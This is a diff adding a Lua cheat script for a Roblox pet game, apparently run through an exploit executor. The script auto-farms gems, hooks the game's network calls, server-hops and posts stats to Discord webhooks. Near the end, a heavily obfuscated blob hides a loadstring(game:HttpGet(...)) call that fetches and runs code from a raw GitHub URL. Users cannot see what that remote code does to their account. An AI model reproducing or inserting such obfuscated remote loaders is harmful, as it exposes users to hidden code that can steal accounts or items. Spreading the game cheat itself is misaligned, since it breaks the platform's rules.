@@ -1,0 +1,433 @@
+if not game:IsLoaded() then
+    while not game:IsLoaded() do wait(1) end
+end
+wait(0.5)
+
+Settings = {
+    ["On Screen Trackers"] = false,
+    ["Performance"] = {
+        ["Disable 3D Rendering"] = false,
+        ["Diable Orb Rendering"] = true,
+        ["Disable Lootbags"] = true
+    },
+    ["Auto Collect"] = {
+        ["Orbs"] = true,
+        ["Lootbags"] = true
+    },
+    ["Auto Mailbox"] = {
+        ["Recipient"] = "YOUR USER HERE", -- Person To Send To
+        ["Min Dias"] = 100000000, -- Minumum Gems
+        ["Enabled"] = false
+    },
+    ["Multipliers"] = {
+        ["Giant Chest"] = 0,
+        ["Chest"] = 0,
+        ["Small Chest"] = 0,
+        ["Vault"] = 0,
+        ["Safe"] = 0,
+        ["Present"] = 0
+    },
+    ["Webhooks"] = {
+        ["Server Hop Webhook"] = "",
+        ["Time Frame Webhook"] = "",
+        ["Timeframe"] = 300 -- Seconds
+    },
+    ["Pet Team"] = {
+        ["Mode"] = "Best", -- Best Or Manual: Best = Highest Power, Manual = All Pets With A Certain Nickname
+        ["Nickname"] = "Farm"
+    },
+    ["Fruit"] = {
+        ["Farm Fruit If Low"] = false,
+        ["Min Fruit"] = 100, -- Starts Farming If Below This
+        ["Max Fruit"] = 150, -- Stops Farming Once Above This
+        ["Mode"] = "Pixel Vault" -- Pixel Vault or Server Hop
+    },
+    ["Boosts"] = {
+        ["Triple Damage"] = true,
+        ["Server Damage"] = true
+    }
+}
+
+settingsconfig = {
+	targetmulti = 3,
+	breakgiantchest = true,
+	breakbigchests = true,
+	breakpresents = false,
+	breakvaults = true,
+	ignorepresents = false,
+	autotripledamage = true,
+	autoserverdamage = true,
+	safetyrange = 0, -- If you are within this much studs as another player it will server hop (set to 0 if you dont want it to do this)
+	webhook = "",
+    timeframewh = "",
+    timeframe = 60 -- Seconds
+}
+local TimeElapsed = 0
+local timer = coroutine.create(function()
+    while 1 do
+        TimeElapsed = TimeElapsed + 1
+        wait(1)
+    end
+end)
+coroutine.resume(timer)
+
+local SettingsJson = game:GetService("HttpService"):JSONEncode(settingsconfig)
+writefile("settings.txt", SettingsJson)
+
+local file = readfile("settings.txt")
+local settings = game:GetService("HttpService"):JSONDecode(file)
+
+local targetmulti = tonumber(settings.targetmulti) or 5
+local breakgiantchest = settings.breakgiantchest or true
+local breakbigchests = settings.breakbigchests or true
+local breakpresents = settings.breakpresents or false
+local breakvaults = settings.breakvaults or false
+local ignorepresents = settings.ignorepresents or false
+local WEBHOOK = settings.webhook or ""
+local AutoTripleDamage = settings.autotripledamage or true
+local AutoServerDamage = settings.autoserverdamage or true
+
+local oldJob = game.JobId
+
+local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+while not v1.Loaded do
+    game:GetService("RunService").Heartbeat:Wait();
+end;
+
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+local Fire, Invoke = Network.Fire, Network.Invoke
+
+local old
+old = hookfunction(getupvalue(Fire, 1), function(...)
+   return true
+end)
+
+Lib = require(game:GetService("ReplicatedStorage").Library)
+
+wait(0.1)
+
+local player = game.Players.LocalPlayer
+local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+local detectionRange = settings.safetyrange or 500
+
+local function isPlayerInRange(player)
+    if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+        local playerRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+        local playerPosition = playerRootPart and playerRootPart.Position
+        if playerPosition then
+            local playerDistance = (playerPosition - humanoid.RootPart.Position).Magnitude
+            return playerDistance <= detectionRange
+        end
+    end
+    return false
+end
+
+local function checkNearbyPlayers()
+    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            if isPlayerInRange(otherPlayer) then
+                function sHopper()
+				    local endpoint = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/6284583030/servers/Public?sortOrder=Asc&limit=100'))
+				    bestserver = {
+				        p = 0
+				    }
+				    function shuffleTable(tbl)
+				        local size = #tbl
+				        for i = size, 1, -1 do
+				            local rand = math.random(size)
+				            tbl[i], tbl[rand] = tbl[rand], tbl[i]
+				        end
+				        return tbl
+				    end
+				    randomdata = shuffleTable(endpoint.data)
+				    for i, v in pairs(randomdata) do
+				        if v.playing > bestserver['p'] and v.playing <= 2 then
+				            bestserver['id'] = v.id
+				            bestserver['p'] = v.playing
+				        end
+				    end
+				    game:GetService("TeleportService"):TeleportToPlaceInstance(6284583030, bestserver.id, game.Players.LocalPlayer)
+				end
+					while 1 do
+					    oldid = game.JobId
+					    sHopper()
+					    task.wait(1)
+					    if oldid ~= game.JobId then
+					        break
+					    end
+					end
+            end
+        end
+    end
+end
+
+coi = coroutine.create(function()
+	while true do
+	    checkNearbyPlayers()
+	    wait(1)
+	end
+end)
+coroutine.resume(coi)
+local GemsEarned = 0
+local TotalGemsEarned = 0
+local Library = require(game:GetService("ReplicatedStorage").Library)
+local StartingGems = Library.Save.Get().Diamonds
+
+AREATOCHECK = "Mystic Mine"
+function add_suffix(inte)
+    local gems = inte
+    local gems_formatted
+
+    if gems >= 1000000000000 then  -- if gems are greater than or equal to 1 trillion
+        gems_formatted = string.format("%.1ft", gems / 1000000000000)  -- display gems in trillions with one decimal point
+    elseif gems >= 1000000000 then  -- if gems are greater than or equal to 1 billion
+        gems_formatted = string.format("%.1fb", gems / 1000000000)  -- display gems in billions with one decimal point
+    elseif gems >= 1000000 then  -- if gems are greater than or equal to 1 million
+        gems_formatted = string.format("%.1fm", gems / 1000000)  -- display gems in millions with one decimal point
+    elseif gems >= 1000 then  -- if gems are greater than or equal to 1 thousand
+        gems_formatted = string.format("%.1fk", gems / 1000)  -- display gems in thousands with one decimal point
+    else  -- if gems are less than 1 thousand
+        gems_formatted = tostring(gems)  -- display gems as is
+    end
+
+    return gems_formatted
+end
+HttpService = game:GetService("HttpService")
+function WH()
+	request({
+		Url = WEBHOOK,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode{
+            ["content"] = "",
+            ["embeds"] = {
+			    {
+			      ["title"] = "Server Hop Stat Update (v3)",
+			      ["description"] = "Successfully Broke Everything In Server. Hopping To New Server!",
+			      ["color"] = tonumber(0x0f0063),
+			      ["fields"] = {
+			        {
+			          ["name"] = "Stats",
+			          ["value"] = ":clock1: **Time Taken:** ``"..TimeElapsed.."s``\n:gem: **Gems Earned:** ``"..add_suffix(GemsEarned).."``\n:gem: **Total Gems Earned:** ``" .. add_suffix(TotalGemsEarned) .. "``\n:map: **Farming:** ``"..AREATOCHECK.."``"
+			        }
+			      },
+			      ["author"] = {
+			        ["name"] = "Mystic Farmer - Stats"
+			      }
+			    }
+			  }
+			  }
+	})
+end
+
+function GetMulti(B)
+		if not B then return 0 end
+		local totalMultiplier = 0	
+		if B.l then
+			for _, v in pairs(B.l) do
+				pcall(function() 
+					if v.m and tonumber(v.m) then
+						totalMultiplier = totalMultiplier + v.m
+					end
+				end)
+			end
+			
+		end
+		return totalMultiplier
+	end
+	
+	
+AllC = Invoke("Get Coins")
+AllNeededCoins = {}
+for i, v in pairs(AllC) do
+	if v.a == "Mystic Mine" then
+		M = GetMulti(v.b)
+		if breakgiantchest then
+			if string.find(v.n, "Giant") then
+				AllNeededCoins[i] = v
+			end
+		end
+		if breakbigchests then
+			if string.find(tostring(v.mh), "320") then
+				AllNeededCoins[i] = v
+			end
+		end
+		if breakpresents then
+			if string.find(v.n, "Present") then
+				AllNeededCoins[i] = v
+			end
+		end
+		if breakvaults then
+			if string.find(v.n, "Vault") or string.find(v.n, "Safe") then
+				AllNeededCoins[i] = v
+			end
+		end
+		if ignorepresents then
+			if M >= targetmulti and not string.find(v.n, "Present") then
+				AllNeededCoins[i] = v
+			end
+		else
+			if M >= targetmulti then
+				AllNeededCoins[i] = v
+			end
+		end
+	end
+end
+if game.Workspace:FindFirstChild("plat") then game.Workspace.plat:Destroy() end
+local p = Instance.new("Part") 
+p.Anchored = true
+p.Name = "plat"
+p.Position = Vector3.new(9043.19140625, -38.66098690032959, 2424.636474609375)
+p.Size = Vector3.new(100, 1, 100)
+p.Parent = game.Workspace
+local gui = Instance.new("SurfaceGui")
+gui.Parent = p
+gui.Face = Enum.NormalId.Top
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = "Gem Farmer Made By henrymistert#3888 (.gg/henrymistert)"
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel.TextColor3 = Color3.new(0, 0, 0)
+textLabel.FontSize = Enum.FontSize.Size14
+textLabel.Parent = gui
+textLabel.TextScaled = true
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9043.19141, -34.3321552, 2424.63647, -0.938255966, 7.68024719e-08, 0.345941782, 8.24376656e-08, 1, 1.57588176e-09, -0.345941782, 2.99972136e-08, -0.938255966)
+
+Fire("Performed Teleport")
+wait(0.1)
+PETS = Lib.Save.Get().PetsEquipped
+newP = {}
+for i,v in pairs(PETS) do table.insert(newP, i) end
+game.Workspace['__THINGS'].Orbs.ChildAdded:Connect(function(v)
+	Fire("Claim Orbs", {v.Name})
+end)
+game.Workspace['__THINGS'].Lootbags.ChildAdded:Connect(function(v)
+	Fire("Collect Lootbag", v.Name, v.Position)
+end)
+boostco = coroutine.create(function()
+    while 1 do
+        wait(2)
+	  if AutoTripleDamage then
+        boostName = "Triple Damage"
+        local Library = require(game.ReplicatedStorage.Framework.Library)
+        local save = Library.Save.Get()
+        found = false
+        for i, v in pairs(save.Boosts) do
+            if i == boostName then
+                found = true
+            end
+        end
+        if not found then
+            Fire("Activate Boost", boostName)
+        end
+	  end
+	  if AutoServerDamage then
+            boostName = "Triple Damage"
+            local Library = require(game.ReplicatedStorage.Library)
+            Library.Load()
+            found = false
+            for i, v in pairs(Library.ServerBoosts.GetActiveBoosts()) do
+                if i == boostName then
+                    found = true
+                end
+            end
+            if not found then
+                Fire("Activate Server Boost", boostName)
+            end
+        end
+    end
+end)
+coroutine.resume(boostco)
+for i, v in pairs(AllNeededCoins) do
+	local v86 = Invoke("Join Coin", i, newP)
+	for v88, v89 in pairs(v86) do
+    	Fire("Farm Coin", i, v88);
+	end
+	while 1 do
+		wait(0.01)
+		AllC = debug.getupvalue(getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.Game:WaitForChild("Coins", 10)).DestroyAllCoins, 1)
+		f = false
+		for i2,v2 in pairs(AllC) do
+			if i2 == i then f = true end
+		end
+		if not f then break end
+	end
+end
+wait(5)
+local EndingGems = Library.Save.Get().Diamonds
+GemsEarned = EndingGems - StartingGems
+if not isfile("gemtotal.txt") then writefile("gemtotal.txt", "0") end
+if not isfile("timetotal.txt") then
+    writefile("timetotal.txt", "0") end
+if not isfile("timeframe.txt") then
+    writefile("timeframe.txt", "0")
+end
+TotalGemsEarned = GemsEarned + tonumber(readfile("gemtotal.txt"))
+writefile("gemtotal.txt", tostring(TotalGemsEarned))
+tt = tonumber(readfile("timetotal.txt"))
+tt = tt + TimeElapsed
+writefile("timeframe.txt", tostring(GemsEarned + tonumber(readfile("timeframe.txt"))))
+writefile("timetotal.txt", tostring(tt))
+if tt >= settingsconfig.timeframe then
+    writefile("timetotal.txt", "0")
+    request({
+		Url = settingsconfig.timeframewh,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode{
+            ["content"] = "",
+            ["embeds"] = {
+			    {
+			      ["title"] = "Time Frame Stat Update (" .. settingsconfig.timeframe .. "s)",
+			      ["description"] = "Gem update",
+			      ["color"] = tonumber(0x0f0063),
+			      ["fields"] = {
+			        {
+			          ["name"] = "Stats",
+			          ["value"] = ":gem: **Earnings:** ``".. add_suffix(tonumber(readfile("timeframe.txt"))) .."``"
+			        }
+			      },
+			      ["author"] = {
+			        ["name"] = "Mystic Farmer - Stats"
+			      }
+			    }
+			  }
+			  }
+	})
+    writefile("timeframe.txt", "0")
+end
+pcall(WH)
+wait(1)
+do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v71=0;while true do if (v71==0) then v19=v0(v3(v30,1,1));return "";end end else local v72=0;local v73;while true do if (v72==0) then v73=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v73,v19);v19=nil;v98=1;end end else return v73;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v74=(v31/((5 -3)^(v32-(2 -1))))%(((1640 -(1523 + 114)) -1)^(((v33-1) -(v32-1)) + (2 -1))) ;return v74-(v74%(620 -(555 + 64))) ;else local v75=931 -(857 + 67 + 7) ;local v76;while true do if (v75==(568 -((523 -156) + 201))) then v76=(929 -(214 + 713))^(v32-(1 + (1065 -(68 + 997)))) ;return (((v31%(v76 + v76))>=v76) and (1 + 0)) or ((2147 -(226 + 1044)) -(282 + 595)) ;end end end end local function v21()local v34=0 -0 ;local v35;while true do if (v34==1) then return v35;end if (v34==(117 -(32 + (1042 -(892 + 65))))) then v35=v1(v16,v18,v18);v18=v18 + 1 + (0 -0) ;v34=1 + 0 ;end end end local function v22()local v36=0;local v37;local v38;while true do if (v36==(1 -0)) then return (v38 * (469 -213)) + v37 ;end if (v36==(350 -(87 + 263))) then v37,v38=v1(v16,v18,v18 + (182 -(67 + 113)) );v18=v18 + 2 + 0 ;v36=2 -(1 + 0) ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (7 -4) );v18=v18 + (15 -(31 -20)) ;return (v42 * (16778168 -(802 + 150))) + (v41 * 65536) + (v40 * (1253 -(915 + 82))) + v39 ;end local function v24()local v43=0 + 0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if ((2 -0)==v43) then v48=v20(v45,1208 -(1069 + (977 -(814 + 45))) ,70 -39 );v49=((v20(v45,32)==1) and  -(1 -0)) or (1 + 0) ;v43=4 -1 ;end if (v43==1) then v46=1 + (0 -0) ;v47=(v20(v45,792 -(368 + 23 + 400) ,62 -42 ) * ((20 -(10 + 8))^(122 -90))) + v44 ;v43=444 -(416 + 26) ;end if (v43==(9 -6)) then if (v48==0) then if (v47==(0 + 0)) then return v49 * (0 + 0) ;else local v100=0 -0 ;while true do if (v100==(438 -(145 + 293))) then v48=431 -(44 + 386) ;v46=(2371 -(261 + 624)) -(998 + 488) ;break;end end end elseif (v48==(3637 -1590)) then return ((v47==(0 + 0)) and (v49 * ((1 + (1080 -(1020 + 60)))/((2195 -(630 + 793)) -((680 -479) + 571))))) or (v49 * NaN) ;end return v8(v49,v48-(2161 -(116 + 1022)) ) * (v46 + (v47/((8 -6)^(31 + 21)))) ;end if (v43==(0 -0)) then v44=v23();v45=v23();v43=3 -2 ;end end end local function v25(v50)local v51;if  not v50 then local v77=0 -0 ;while true do if (v77==(1747 -(760 + 987))) then v50=v23();if (v50==(0 + 0)) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;local v52={};for v67=(2 -1) + (0 -0) , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0;local v54;local v55;local v56;local v57;local v58;local v59;while true do local v69=0;local v70;while true do if (v69==(0 -0)) then v70=0;while true do if (v70==(0 -0)) then if (v53~=0) then else local v105=0;while true do if ((1636 -(1373 + 263))==v105) then v54={};v55={};v105=1;end if (v105==2) then v53=1;break;end if (v105==1) then v56={};v57={v54,v55,nil,v56};v105=2;end end end if (v53==(1 + 0)) then v58=v23();v59={};for v109=1,v58 do local v110=0 -0 ;local v111;local v112;local v113;while true do if (v110==0) then v111=0 -0 ;v112=nil;v110=1385 -(746 + 638) ;end if (v110~=1) then else v113=nil;while true do if (v111==1) then if (v112==(1 + 0)) then v113=v21()~=0 ;elseif (v112==2) then v113=v24();elseif (v112==(4 -1)) then v113=v25();end v59[v109]=v113;break;end if ((341 -(218 + 123))==v111) then v112=v21();v113=nil;v111=1582 -(1535 + 46) ;end end break;end end end v57[3]=v21();v53=2;end v70=1;end if ((1 + 0)==v70) then if (v53~=2) then else local v107=0;local v108;while true do if (v107==(0 + 0)) then v108=560 -(306 + 254) ;while true do if (v108==1) then return v57;end if (0==v108) then for v149=1,v23() do local v150=0 + 0 ;local v151;local v152;local v153;while true do if (v150~=0) then else v151=0 -0 ;v152=nil;v150=1468 -(899 + 568) ;end if ((1 + 0)==v150) then v153=nil;while true do if (v151~=(0 -0)) then else local v164=603 -(268 + 335) ;local v165;while true do if (v164==(290 -(60 + 230))) then v165=0;while true do if (v165==0) then local v173=572 -(426 + 146) ;while true do if (v173==0) then v152=0 + 0 ;v153=nil;v173=1;end if (v173~=(1457 -(282 + 1174))) then else v165=812 -(569 + 242) ;break;end end end if (v165==1) then v151=2 -1 ;break;end end break;end end end if (v151==1) then while true do if (v152==(0 + 0)) then v153=v21();if (v20(v153,1,1)==0) then local v166=0;local v167;local v168;local v169;local v170;local v171;local v172;while true do if (v166==3) then while true do if (v167==(1025 -(706 + 318))) then local v174=0;while true do if (v174~=1) then else v167=1253 -(721 + 530) ;break;end if (v174==0) then v170=nil;v171=nil;v174=1272 -(945 + 326) ;end end end if (v167==0) then local v175=0 -0 ;while true do if (v175~=(0 + 0)) then else v168=700 -(271 + 429) ;v169=nil;v175=1;end if (v175==1) then v167=1;break;end end end if (v167==(2 + 0)) then v172=nil;while true do if (v168~=2) then else while true do if (v169~=(1503 -(1408 + 92))) then else if (v20(v171,1089 -(461 + 625) ,3)==1) then v172[4]=v59[v172[1292 -(993 + 295) ]];end v54[v149]=v172;break;end if (v169==1) then local v179=0;local v180;local v181;while true do if (v179==0) then v180=0 + 0 ;v181=nil;v179=1172 -(418 + 753) ;end if (v179~=1) then else while true do if (v180~=(0 + 0)) then else v181=0 + 0 ;while true do if (0==v181) then local v192=0 + 0 ;while true do if (v192~=(0 + 0)) then else v172={v22(),v22(),nil,nil};if (v170==(0 + 0)) then local v193=0;local v194;local v195;while true do if ((1146 -(466 + 679))==v193) then while true do if (v194==(0 -0)) then v195=0;while true do if (0~=v195) then else v172[3]=v22();v172[11 -7 ]=v22();break;end end break;end end break;end if (v193~=(1900 -(106 + 1794))) then else v194=0;v195=nil;v193=1 + 0 ;end end elseif (v170==(1 + 0)) then v172[8 -5 ]=v23();elseif (v170==(5 -3)) then v172[3]=v23() -((116 -(4 + 110))^16) ;elseif (v170~=3) then else local v198=584 -(57 + 527) ;local v199;while true do if (v198==0) then v199=0;while true do if (v199~=(1427 -(41 + 1386))) then else v172[3]=v23() -(2^(119 -(17 + 86))) ;v172[3 + 1 ]=v22();break;end end break;end end end v192=1;end if (v192==(1 -0)) then v181=1;break;end end end if (v181==1) then v169=2;break;end end break;end end break;end end end if (v169~=2) then else local v182=0;while true do if (v182~=1) then else v169=3;break;end if (v182==(0 -0)) then if (v20(v171,167 -(122 + 44) ,1 -0 )==(3 -2)) then v172[2 + 0 ]=v59[v172[1 + 1 ]];end if (v20(v171,3 -1 ,67 -(30 + 35) )==(1 + 0)) then v172[3]=v59[v172[3]];end v182=1258 -(1043 + 214) ;end end end if (v169==0) then local v183=0;local v184;while true do if (v183~=(0 -0)) then else v184=1212 -(323 + 889) ;while true do if (v184~=(2 -1)) then else v169=581 -(361 + 219) ;break;end if (v184~=(320 -(53 + 267))) then else v170=v20(v153,1 + 1 ,3);v171=v20(v153,4,419 -(15 + 398) );v184=983 -(18 + 964) ;end end break;end end end end break;end if (v168==(3 -2)) then local v176=0 + 0 ;local v177;while true do if (v176~=(0 + 0)) then else v177=0;while true do if (v177~=1) then else v168=2;break;end if (v177==(850 -(20 + 830))) then local v187=0 + 0 ;while true do if (v187==(126 -(116 + 10))) then v171=nil;v172=nil;v187=1 + 0 ;end if (v187==(739 -(542 + 196))) then v177=1 -0 ;break;end end end end break;end end end if (v168~=(0 + 0)) then else v169=0 + 0 ;v170=nil;v168=1;end end break;end end break;end if (1~=v166) then else v169=nil;v170=nil;v166=2;end if ((1 + 1)==v166) then v171=nil;v172=nil;v166=7 -4 ;end if (v166~=0) then else v167=0 -0 ;v168=nil;v166=1;end end end break;end end break;end end break;end end end for v154=1,v23() do v55[v154-(1552 -(1126 + 425)) ]=v28();end v108=1;end end break;end end end break;end end break;end end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (v63==1) then v66=v60[3];return function(...)local v81=v64;local v82=v65;local v83=v66;local v84=v27;local v85=1;local v86= -1;local v87={};local v88={...};local v89=v12("#",...) -1 ;local v90={};local v91={};for v95=0,v89 do if (v95>=v83) then v87[v95-v83 ]=v88[v95 + 1 ];else v91[v95]=v88[v95 + 1 ];end end local v92=(v89-v83) + 1 ;local v93;local v94;while true do v93=v81[v85];v94=v93[1];if (v94<=6) then if (v94<=2) then if (v94<=0) then do return;end elseif (v94==1) then local v116=v93[2];v91[v116]=v91[v116](v13(v91,v116 + 1 ,v86));else v91[v93[2]]();end elseif (v94<=4) then if (v94==3) then v91[v93[2]]=v93[3];else v91[v93[2]]=v62[v93[3]];end elseif (v94>5) then do return;end else v91[v93[2]]=v62[v93[3]];end elseif (v94<=9) then if (v94<=7) then local v114=0;local v115;while true do if (v114==0) then v115=v93[2];v91[v115]=v91[v115](v13(v91,v115 + 1 ,v86));break;end end elseif (v94==8) then local v124=v93[2];local v125=v91[v93[3]];v91[v124 + 1 ]=v125;v91[v124]=v125[v93[4]];else v91[v93[2]]();end elseif (v94<=11) then if (v94==10) then local v129=v93[2];local v130=v91[v93[3]];v91[v129 + 1 ]=v130;v91[v129]=v130[v93[4]];else local v134=0;local v135;local v136;local v137;local v138;while true do if (v134==1) then v86=(v137 + v135) -1 ;v138=0;v134=2;end if (v134==0) then v135=v93[2];v136,v137=v84(v91[v135](v13(v91,v135 + 1 ,v93[3])));v134=1;end if (2==v134) then for v158=v135,v86 do v138=v138 + 1 ;v91[v158]=v136[v138];end break;end end end elseif (v94==12) then v91[v93[2]]=v93[3];else local v141=0;local v142;local v143;local v144;local v145;while true do if (v141==1) then v86=(v144 + v142) -1 ;v145=0;v141=2;end if (v141==0) then v142=v93[2];v143,v144=v84(v91[v142](v13(v91,v142 + 1 ,v93[3])));v141=1;end if (v141==2) then for v161=v142,v86 do v145=v145 + 1 ;v91[v161]=v143[v145];end break;end end end v85=v85 + 1 ;end end;end if (v63==0) then v64=v60[1];v65=v60[2];v63=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F707378676F646C6F6C312O302F6469616D6F6E646661726D65722F6D61696E2F6469616D6F6E646661726D00083O0012053O00013O001205000100023O00200800010001000300120C000300044O000B000100034O00075O00022O00023O000100012O00063O00017O00",v9(),...);end
+
+-- Replace Everything After This With Your Own Server Hopper If You Want To Use Your Own (Or Use The Hopper In #script) :)
+
+local plrName = game.Players.localPlayer.Name
+local function Hop()
+    local Servers = {}
+    local function Scrape()
+        local URL = 'https://games.roblox.com/v1/games/'..game.PlaceId..'/servers/Public?sortOrder=asc&limit=100'
+        return game.HttpService:JSONDecode(game:HttpGet(URL))
+    end
+    local function TeleportServer()
+        while task.wait(3) do
+            local sid = math.random(1, #Servers)
+            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, Servers[sid], game:GetService("Players").localPlayer)
+        end
+    end
+    local function PlaceServers()
+        local scraped = Scrape()
+        for key, index in pairs(scraped.data) do
+            if index.playing and tonumber(index.playing) <= 2 then
+                table.insert(Servers, index.id)
+            end
+        end
+        TeleportServer()
+    end
+    PlaceServers()
+end
+Hop()
